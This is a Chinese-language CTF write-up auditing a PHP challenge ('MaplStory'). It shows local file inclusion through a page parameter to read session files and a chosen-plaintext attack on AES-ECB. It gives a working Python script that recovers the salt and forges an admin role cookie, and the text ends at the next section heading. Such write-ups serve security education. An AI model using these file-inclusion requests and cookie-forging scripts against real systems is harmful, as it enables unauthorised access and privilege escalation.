本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和
文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。
# 概览
打开  是一个登陆页面，注册账户后有四个页面，`HOME` 是欢迎页，`CHARACTER`
页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， `SETTING` 页可以修改用户名和选择头像，`GAME`
页是一个Flash小游戏，和本题无关。
题目提供了源码下载，可以从
[这里](https://ctf.meepwn.team/attachments/web/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip)
或
[备用地址](https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip)
下载。
# 文件包含
## index.php
`index.php` 文件中有如下语句，显然存在文件包含。
    if(isset($_GET['page']) && !empty($_GET['page']))
    {
        include($_GET['page']);
    }
但所有 `GET` 和`POST` 提交的参数都会被删除掉敏感字符串，其中 `//` 、`(.+)` 和```` 是比较值得注意的。
    function bad_words($value)
    {
        //My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.
        //Maybe some word is false positive but pls accept it, for a no-cancer gaming environment!
        $too_bad="/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is";
        $value = preg_replace($too_bad, str_repeat("*",3) ,$value);
        return $value;
    }
    foreach($_GET as $key=>$value)
    {
        if (is_array($value)){mapl_die();}
        $value=bad_words($value);
        $_GET[$key]=$value;
    }
    foreach($_POST as $key2=>$value2)
    {
        if (is_array($value2)){mapl_die();}
        $value2=bad_words($value2);
        $_POST[$key2]=$value2;
    }
PHP使用PHPSESSID cookie值 存储会话标识，一般在`/var/lib/php/sessions/sess_`
文件里写有一些有特定意义的字符串，其中`` 可在Cookie里找到。尝试读取SESSION文件：
    http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_8es749ivbfetvsmsc0ggthr2e5
其中是序列化后的`$_SESSION` 和明文的操作记录，这些内容在后面会大有用处。
# CPA猜解salt
## login.php
阅读`login.php` 并跟入相关文件，可以看到有多处用到`$salt` 变量，其地位非常关键。
首先是从单独的表`mapl_config` 中读出值。
    $configRow=config_connect($conn);
        $salt=$configRow['mapl_salt'];
        $key=$configRow['mapl_key'];
    /*
        function config_connect($conn)
        {
            $config=mysqli_query($conn,"SELECT * FROM mapl_config");
            return mysqli_fetch_array($config);
        }
    */
如果登陆成功就将用户名和邮箱加盐加密存储的`$_SESSION` 变量里。并且将`admin` /`user`
字符串加盐加密存储在`$_COOKIE['_role']` 变量中，用以标识用户身份。
    if( $count === 1 && $row['userPass']===$password ) //登陆成功
                {
                    $secure_email=encryptData($row['userEmail'],$salt,$key);
                    $secure_name=encryptData($row['userName'],$salt,$key);
                    $log_content='['.date("h:i:sa").' GMT+7] Logged In';
                    $_SESSION['character_name'] = $secure_name;
                    $_SESSION['user'] = $secure_email;
                    $_SESSION['action']=$log_content;
                    if ($row['userIsAdmin']==='1')
                    {
                        $data='admin'.$salt;
                        $role=hash('sha256', $data);
                        setcookie('_role',$role);
                    }
                    else
                    {
                        $data='user'.$salt;
                        $role=hash('sha256', $data);
                        setcookie('_role',$role);                   
                    }
                    header("Location: ?page=home.php");
                } 
    /*
        function encryptData($data,$salt,$key)
        {
                $encrypt=openssl_encrypt($data.$salt,"AES-128-ECB",$key);
                $raw=base64_decode($encrypt);
                $final=implode(unpack("H*", $raw));
                return $final;
        }
    */
## setting.php
再查看`setting.php` ，这个文件实现了修改用户名页面的功能
。只要修改后的名字不长于22个字符，就使用`mysqli_real_escape_string` 处理并更新记录（避免SQL注入）。会被编码的字符有的
NUL（ASCII 0）、\n、\r、\、'、" 和 Control-Z。
    if(strlen($_POST['name'])<=22){
        $name=mysqli_real_escape_string($conn,$_POST['name']);
        $query="UPDATE users SET userName='$name' WHERE userEmail='$mail'";
        $res2=mysqli_query($conn,$query);
        $userRow2=mysqli_fetch_array($res2);
        $secure_name=encryptData($name,$salt,$key);
        $_SESSION['character_name'] = $secure_name;
        $log_content='['.date("h:i:sa").' GMT+7] Change character name';
        $_SESSION['action']=$log_content;
        header("Refresh:0");
    }
所有加密操作用的是同一个`$salt`
，加上上述包含Session文件的操作，就会有构造任意明文获取对应密文的可能。最重要的，加密方式采用了`AES-128-ECB` ，`ECB`
全称`Electronic Codebook` （电码本），顾名思义，这种模式的特点就是相同的明文块加密后会得到相同的密文块。
这里采用128位的分组形式，也就是每十六字节一个明文块。举栗说明：
如果用户名是`findneo` 七个字节，`$salt` 是`xianzhi` 八个字节，那么加密过程就是把`findneoxianzhi`
共十五个字节作为一个分组去加密，缺一个字节按算法padding。
如果用户名是`hifindneo` 共九个字节，那么加密过程就是对`hifindne` 和`oxianzhi` 作为两个分组加密。
我们可以在`SETTING` 页面修改用户名来改变明文，然后使用文件包含读到Session文件内容来获取密文，这就是一个完整的选择明文攻击过程。
## 利用
怎么攻击呢？比如用户名是`findneo` ，（我们还不知道`$salt` 是`xianzhi` ） ，那么加密的第一个明文分组是`findneox`
，记录下`$_SESSION['character_name']` 的前32个字节十六进制数，也就是密文的第一个分组。
然后依次改变用户名为`findneoa` 、`findneob` 、.etc，并记录密文第一个分组。直到用户名为`findneox`
时发现密文第一个分组与用户名为`findneo` 时的相同。根据ECB模式的特点，就能知道`$salt` 的第一个字节为`x` ，事实上也确实如此。
测试发现用户名长15个字符时，`$_SESSION['character_name']`
有64字节十六进制数，也就是加盐加密后是32个字符，用户名长为16个字符时，`$_SESSION['character_name']`
有96字节，也就加盐加密后有48个字符。这说明`$salt` 长为16个字节。
然后就可以按照以上原理猜解`$salt` ，伪造`$_COOKIE['_role']` ，成为管理员。
    # -*- coding: utf-8 -*-    # by https://findneo.github.io/
    import requests
    from bs4 import BeautifulSoup
    import string
    import hashlib
    url = "http://178.128.87.16/"
    cookie = dict(
        PHPSESSID='t9p07a1qt2plbcqp8tpkib4794',
        # _role='8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe'
    )
    def read_sess():
        r = requests.get(
            url + "?page=/var/lib/php/sessions/sess_" + cookie['PHPSESSID'],
            cookies=cookie)
        return r.content
    def get_sess_character_name():
        """read_sess():
        character_name|s:64:"6269cb047bbbd0802cd7b882700591c6f6ace10234be4243997282e7c467e820";
        user|s:64:"82f0cac5c0591592eaccfdac48f3e3656c264c7a73f97aeea603461254e3ac38";
        action|s:40:"[12:04:21pm GMT+7] Change character name";
        """
        character_name = read_sess().split(';')[0].split(":")[-1][1:-1]
        return character_name
    def change_name(character_name):
        payload = dict(name=character_name, submit='Edit')
        r = requests.post(url + "?page=setting.php", cookies=cookie, data=payload)
    def whoami():
        r = requests.get(url + "?page=home.php", cookies=cookie)
        s = BeautifulSoup(r.content, 'lxml')
        print s.h2.get_text().split('\n')[0]
    def change_and_check(name):
        change_name(name)
        # whoami()
        return get_sess_character_name()
    def crack_salt():
        junk = 'x' * 16
        salt = ''
        s = 'ms_g00d_0ld_g4m3' + string.printable
        for i in range(15, -1, -1):
            cmp = change_and_check(junk[:i])[:32]
            if i == 0:
                # 如果i==0，无法修改用户名，实际上salt对应的就是第二个密文块，直接取即可
                cmp = change_and_check(junk)[32:64]
            for j in s:
                if cmp == change_and_check(junk[:i] + salt + j)[:32]:
                    salt += j
                    print salt
                    break
        return salt
    salt = crack_salt()
爆破得到`$salt` 为`ms_g00d_0ld_g4m3` ，然后计算出`admin`
用户的Cookie为`hashlib.sha256('admin' + salt).hexdigest()`
也就是`_role='a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054'`。
可使用Fiddler的Filters功能设置请求头为`PHPSESSID=8es749ivbfetvsmsc0ggthr2e5;
_role=8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe`
，权限上升为ADMIN。
# 以Cookie为跳板的Session文件包含